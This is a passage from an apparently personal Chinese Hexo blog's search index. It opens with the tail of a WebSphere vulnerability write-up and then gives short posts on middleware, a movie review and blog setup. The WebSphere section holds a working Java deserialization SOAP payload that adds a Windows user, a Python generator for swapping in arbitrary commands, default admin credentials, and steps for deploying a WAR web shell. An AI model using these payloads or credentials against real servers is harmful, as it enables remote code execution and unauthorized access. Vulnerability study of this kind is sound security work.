GFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4&quot; xmlns:ns0=&quot;admin&quot; ns0:WASRemoteRuntimeVersion=&quot;8.5.5.7&quot; ns0:JMXMessageVersion=&quot;1.2.0&quot; ns0:JMXVersion=&quot;1.2.0&quot;&gt;</span><br><span class="line">&lt;/SOAP-ENV:Header&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;ns1:invoke xmlns:ns1=&quot;urn:AdminService&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;objectname xsi:type=&quot;ns1:javax.management.ObjectName&quot;&gt;rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==&lt;/objectname&gt;</span><br><span class="line">&lt;operationname xsi:type=&quot;xsd:string&quot;&gt;getUnsavedChanges&lt;/operationname&gt;</span><br><span class="line">&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFW5ldCB1c2VyIGx4aCBseGggL2FkZHQABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAABB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6&lt;/params&gt;</span><br><span class="line">&lt;signature xsi:type=&quot;ns1:[Ljava.lang.String;&quot;&gt;rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=&lt;/signature&gt;</span><br><span class="line">&lt;/ns1:invoke&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>Payload执行的命令是 net user lxh lxh &#x2F;add,效果如下：</p>
<p>如果想要更改执行的命令，可通过如下代码，代码在python3下执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from binascii import unhexlify</span><br><span class="line">command = &quot;net user lxh lxh /add&quot;</span><br><span class="line">serObj = unhexlify(&quot;ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400&quot;)</span><br><span class="line">serObj += (chr(len(command)) + command).encode(&#x27;ascii&#x27;)</span><br><span class="line">serObj += unhexlify(&quot;740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A&quot;)</span><br><span class="line">serObjB64 = base64.b64encode(serObj).decode()</span><br><span class="line">print(serObjB64)</span><br></pre></td></tr></table></figure>

<p>将输出的serObjB64，替换到上面Payload中的params节点，其余无需改变。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;&#123;serObjB64&#125;&lt;/params&gt;</span><br></pre></td></tr></table></figure>

<p>回显参考DeserializeExploit.jar(laster)</p>
<p>修复建议修复建议</p>
<p>7.x版本已不提供支持，因此选择升级版本。<br>若版本还在IBM支持范围，可选择打补丁。</p>
<h3 id="弱口令弱口令-amp-amp-后台后台-Getshell"><a href="#弱口令弱口令-amp-amp-后台后台-Getshell" class="headerlink" title="弱口令弱口令 &amp;&amp; 后台后台 Getshell"></a>弱口令弱口令 &amp;&amp; 后台后台 Getshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在6.x至7.0版本，后台登陆只需要输入 admin作为用户标识，无需密码，即可登陆后台。</span><br><span class="line">2. websphere/ websphere</span><br><span class="line">3. system/ manager</span><br></pre></td></tr></table></figure>

<p>1.点击WebSphere 企业应用程序，点击安装。</p>
<p>2.上传war包，点击下一步。</p>
<p>3.一直点击下一步，直到下图，填写上下文根，关系到你访问的URL，接着一直点下一步直到安装完成。</p>
<p>4.安装完成之后，点击保存主配置，然后回到WebSphere 企业应用程序，选中war包启动，访问shell。</p>
<p>修复建议修复建议</p>
<p>设置密码。</p>
<h3 id="参考资料参考资料"><a href="#参考资料参考资料" class="headerlink" title="参考资料参考资料"></a>参考资料参考资料</h3><p><a href="https://www.google.com.hk/">https://www.google.com.hk</a><br><a href="https://www.baidu.com/">https://www.baidu.com</a><br><a href="http://www.wooyun.org/">http://www.wooyun.org</a><br><a href="https://github.com/vulhub">https://github.com/vulhub</a> 漏洞列表<br><a href="http://cve.mitre.org/">http://cve.mitre.org</a> 漏洞列表</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>常见中间件的总结</title>
    <url>/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="1-Apache"><a href="#1-Apache" class="headerlink" title="1.Apache"></a>1.Apache</h3><p>​		Apache HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上。其属于应用服务器。Apache 支持支持模块多，性能稳定，Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等。</p>
<p>（Apche 可以支持PHPcgiperl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Apache 转发给Tomcat处理。）</p>
<p>缺点：配置相对复杂，自身不支持动态页面。</p>
 <span id="more"></span>

<h3 id="2-Tomcat"><a href="#2-Tomcat" class="headerlink" title="2.Tomcat"></a>2.Tomcat</h3><p>Tomcat 是应用（Java）服务器，它只是一个Servlet（JSP也翻译成Servlet）容器，可以认为是Apache的扩展，但是可以独立于Apache运行，适用于本地开发、小项目或个人开发，Apache为HTML页面服务，而tomcat实际操作JSP页面和servlet，但是tomcat处理静态html的能力不如Apache服务器。</p>
<p>特点：支持最新标准、更新快、跨平台、体积小安装部署方便。</p>
<h3 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h3><p>Nginx 是俄罗斯人编写的十分轻量级的HTTP服务器，Nginx，它的发音为“engine X”，是一个高性能的HTTP和反向代理服务器，同时也是一个IMAP&#x2F;POP3&#x2F;SMTP代理服务器。</p>
<h3 id="4-weblogic"><a href="#4-weblogic" class="headerlink" title="4.weblogic"></a>4.weblogic</h3><p>大型项目或商业项目，Java动态功能和Java<br>Enterprise在大型网络应用的开发、集成、部署和管理中，引入了标准的安全性bea公司生产的基础j2ee架构中间件。</p>
<p>特点：简化了可移植和可扩展应用系统的开发，为其他应用系统和系统提供了丰富的可操作性;商业软件功能齐全强大，主要用于大型企业的大型项目;是一种高扩展的架构体系。</p>
<h3 id="5-jetty"><a href="#5-jetty" class="headerlink" title="5.jetty"></a>5.jetty</h3><p>jetty是使用Java语言编写，jetty运行速度快，轻量级，在Java中可以从test<br>case控制其运行。从而使自动化测试不再依赖外部环境，顺利实现自动化测试。</p>
<p>特点：易用、可扩展、易嵌入;快速高效。</p>
<h3 id="6-JBoss"><a href="#6-JBoss" class="headerlink" title="6.JBoss"></a>6.JBoss</h3><p>管理EJB容器和服务器，JBoss遵循商业友好LGPL授权分发，由开源社区开发。</p>
<p>特点：应用服务器也有许多优秀的特点;内存和硬盘空间相对较小;安装方便，解压后，只需配置一些环境变量即可;JBoss支持集群等。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>加密实验</title>
    <url>/2023/02/04/%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="322460698ad58fcf9afc64f2286fa3d231c7116747e5eb0ed969ca8fa9f1c1f8">846ad8ec6e6943494449754732cecabb0692a1304be39474ee8329e6d325badb03731f5c49b8db331f3a7bedf6a74845</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">弱口令</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>流浪地球2观后感</title>
    <url>/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h1 id="胡言乱语"><a href="#胡言乱语" class="headerlink" title="胡言乱语"></a>胡言乱语</h1><p><img src="/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/a0372ef0903b1723232b7a3ae65d161.jpg" alt=" "></p>
<p>凎，这图怎么就是不显示</p>
<p>哦哦哦，成了</p>
 <span id="more"></span>

<p>hexo+typora无法显示图片的解决方法</p>
<h2 id="hexo设置"><a href="#hexo设置" class="headerlink" title="hexo设置"></a>hexo设置</h2><ul>
<li>在博客根目录下的_config.yml文件中，将post_asset_folder字段设置为true</li>
<li><img src="/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/image-20230204195347685.png" alt="image-20230204195347685"></li>
</ul>
<p><img src="/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/image-20230204195228829.png" alt="image-20230204195228829"></p>
<p>当设置 post_asset_folder 参数后，在hexo n命令建立文件时， 会自动建立一个与文章同名的文件夹，把与该文章相关的所有图片资源都放到此文件夹内，这样就可以方便的使用图片资源</p>
<p>同时，只有当post_asset_folder设置为true后，后续安装的插件才会起作用</p>
<ul>
<li><p>安装插件</p>
<p>在根目录执行</p>
<p><code>npm install https://github.com/CodeFalling/hexo-asset-image --save</code></p>
</li>
</ul>
<h2 id="Typora设置："><a href="#Typora设置：" class="headerlink" title="Typora设置："></a>Typora设置：</h2><p>文件中选偏好设置</p>
<p><img src="/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/image-20230204195835546.png" alt="image-20230204195835546"></p>
<p>然后点图像，如下配置：</p>
<p><img src="/2023/02/04/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%832%E8%A7%82%E5%90%8E%E6%84%9F/image-20230204195906816.png" alt="image-20230204195906816"></p>
<p>参考文章：<a href="https://blog.csdn.net/hbhgf/article/details/115394764">https://blog.csdn.net/hbhgf/article/details/115394764</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>立场：本人数字生命派，人生苦短，机械飞升</p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><h3 id="首先是特效"><a href="#首先是特效" class="headerlink" title="首先是特效"></a>首先是特效</h3><p>确实达到了世界一流水平，其中最令我印象深刻的是太空电梯和月球爆炸，视觉效果与音效令人深刻，全片的细节也很丰富</p>
<h3 id="然后是剧情"><a href="#然后是剧情" class="headerlink" title="然后是剧情"></a>然后是剧情</h3><p>三条线，分别是战狼线，图恒宇线，周线，三条线没有交集，却又互相影响，让我想起了当时看《三体1》的时候，罗辑和章北海，都为人类做出了巨大的牺牲与无与伦比的贡献，但两人到最后都未曾谋面，有一种宿命感，和史诗感</p>
<p>后面准备二刷，刷完再写吧</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>第一次建立属于自己的博客，感觉真不错。</p>
<h3 id="记录一下博客的制作过程"><a href="#记录一下博客的制作过程" class="headerlink" title="记录一下博客的制作过程"></a>记录一下博客的制作过程</h3><ul>
<li><p><input checked disabled type="checkbox"> 
算了，好麻烦，不想写了，直接见参考文章。</p>
</li>
<li><p><input disabled type="checkbox"> 
有时间再写吧</p>
</li>
</ul>
<p><img src="/2023/02/03/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/1.png" alt=" "></p>
 <span id="more"></span>



<p>参考文章：</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&mid=2247484589&idx=1&sn=7ef61ad418eb4b16d3587a5859f5ce8e&chksm=fa0e6b2ccd79e23afc1767f07afeec6f3dd3de0be44be01c7548afd6476015b0c3d91528088c&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&amp;mid=2247484589&amp;idx=1&amp;sn=7ef61ad418eb4b16d3587a5859f5ce8e&amp;chksm=fa0e6b2ccd79e23afc1767f07afeec6f3dd3de0be44be01c7548afd6476015b0c3d91528088c&amp;scene=21#wechat_redirect</a></p>
<p><a href="http://www.manongjc.com/detail/54-mjacwxjjdprjsst.html">http://www.manongjc.com/detail/54-mjacwxjjdprjsst.html</a></p>
<p>两个都要看，先看第一个</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>技术分享</tag>
      </tags>
  </entry>
</search>
